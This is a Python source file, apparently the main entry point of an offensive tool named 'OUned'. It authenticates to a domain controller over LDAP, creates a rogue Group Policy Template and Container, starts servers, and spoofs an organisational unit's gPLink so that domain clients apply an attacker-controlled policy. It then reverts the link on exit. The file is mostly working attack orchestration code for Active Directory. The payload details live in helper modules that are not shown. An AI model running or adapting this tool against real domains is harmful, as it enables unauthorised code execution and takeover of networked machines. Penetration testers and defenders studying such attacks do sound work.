import typer
import logging
import os
import json
from typing_extensions import Annotated
from time import sleep
from datetime import datetime
from ldap3 import BASE

from helpers.utils import bcolors, logger

from helpers.ldap import get_ldap_session, check_ldap_machine_object, spoof_ou_gplink, get_entries
from helpers.setup_gpt import create_gpt
from helpers.setup_gpc import create_gpc

from helpers.clean import clean_create_folder, revert_ou_gplink
from helpers.cli_config import parse_config
from helpers.servers import start_servers

app = typer.Typer(context_settings={"help_option_names": ["-h", "--help"]}, add_completion=False, pretty_exceptions_enable=False, pretty_exceptions_short=True)

def set_verbosity(value):
    if value == 0:
        logger.setLevel(logging.WARN)
    elif value == 1:
        logger.setLevel(logging.INFO)
    elif value >= 2:
        logger.setLevel(logging.DEBUG)
    return value

@app.command()
def main(
    config: Annotated[str, typer.Option("--config", help="The configuration file for OUned")],
    clean: Annotated[str, typer.Option("--clean", help="This flag indicates that OUned should only perform cleaning actions. This argument takes the path to the cleaning directory containing the 'actions.json' file. In that case, only the 'domain' and authentication information are required in the configuration file")] = None,
    verbose: Annotated[int, typer.Option("--verbose", "-v", help="Enable verbose output (-v or -vv)", callback=set_verbosity, count=True)] = 0
):

    logger.warning(f"\n{bcolors.OKCYAN}[*] OUned execution - {datetime.now()}{bcolors.ENDC}")

    if clean is not None:
        cfg = parse_config(config, True)
        logger.warning(f"{bcolors.BOLD}[*] Cleaning up from cleaning folder '{clean}'{bcolors.ENDC}")
        ldap_session = get_ldap_session(cfg.domain, cfg.dc_ip, cfg.ldaps, cfg.username, cfg.password, cfg.kerberos)
        logger.warning(f"{bcolors.OKGREEN}[+] LDAP session established as {cfg.username}{bcolors.ENDC}")
        revert_ou_gplink(ldap_session, clean)
        return

    # Initialize Environment
    logger.warning(f"\n{bcolors.OKCYAN}[*] Initializing environment{bcolors.ENDC}")
    clean_folder = clean_create_folder()
    logger.warning(f"{bcolors.BOLD}[*] Clean folder is '{clean_folder}'{bcolors.ENDC}")

    # Parse Configuration
    cfg = parse_config(config)

    # Initialize LDAP session
    logger.warning(f"\n{bcolors.OKCYAN}[*] Initializing LDAP session{bcolors.ENDC}")
    ldap_session = get_ldap_session(cfg.domain, cfg.dc_ip, cfg.ldaps, cfg.username, cfg.password, cfg.kerberos)
    logger.warning(f"{bcolors.OKGREEN}[+] LDAP session established as {cfg.username}{bcolors.ENDC}")

    # Retrieve target domain SID
    logger.warning(f"\n{bcolors.OKCYAN}[*] Retrieving target domain SID{bcolors.ENDC}")
    entries = get_entries(ldap_session, cfg.domain_dn, "(objectClass=domain)", search_scope=BASE, attributes=["objectSid"])
    if len(entries) > 0:
        cfg.domain_sid = str(entries[0]['attributes']['objectSid'])
        logger.warning(f"[*] Target domain SID: {cfg.domain_sid}")
    else:
        logger.error(f"{bcolors.FAIL}[-] Failed to retrieve target domain SID{bcolors.ENDC}")
        raise typer.Exit(1)

    # Check LDAP machine
    logger.warning(f"\n{bcolors.OKCYAN}[*] Checking LDAP machine{bcolors.ENDC}")
    check_ldap_machine_object(ldap_session, cfg)

    # Setup Group Policy Template
    logger.warning(f"\n{bcolors.OKCYAN}[*] Setting up Group Policy Template{bcolors.ENDC}")
    modules = create_gpt(cfg, clean_folder)

    # Setup Group Policy Container
    logger.warning(f"\n{bcolors.OKCYAN}[*] Setting up Group Policy Container{bcolors.ENDC}")
    create_gpc(cfg, modules, clean_folder)

    # Start servers
    logger.warning(f"\n{bcolors.OKCYAN}[*] Starting servers{bcolors.ENDC}")
    start_servers(cfg, clean_folder, verbose)

    # Spoof GPLink
    logger.warning(f"\n{bcolors.OKCYAN}[*] Spoofing GPLink{bcolors.ENDC}")
    spoof_ou_gplink(ldap_session, cfg, clean_folder)

    # Run and interrupt upon CTRL+C
    try:
        logger.warning(f"\n{bcolors.OKCYAN}[*] Waiting for clients to update their GPOs{bcolors.ENDC}")
        if cfg.smb_mode == "domain":
            logger.warning(f"{bcolors.BOLD}[!] SMB mode is 'domain'. Transfer the content of the {clean_folder}/GPT folder to the target SMB share (\\\\{cfg.smb_ip}\\{cfg.smb_share}){bcolors.ENDC}")
        while True:
            sleep(1)
    except KeyboardInterrupt:
        logger.warning(f"\n\n{bcolors.OKCYAN}[*] Exiting...{bcolors.ENDC}")
        
        # Refresh LDAP session
        ldap_session = get_ldap_session(cfg.domain, cfg.dc_ip, cfg.ldaps, cfg.username, cfg.password, cfg.kerberos)
        
        # Revert GPLink
        revert_ou_gplink(ldap_session, clean_folder)
        return

if __name__ == "__main__":
    app()
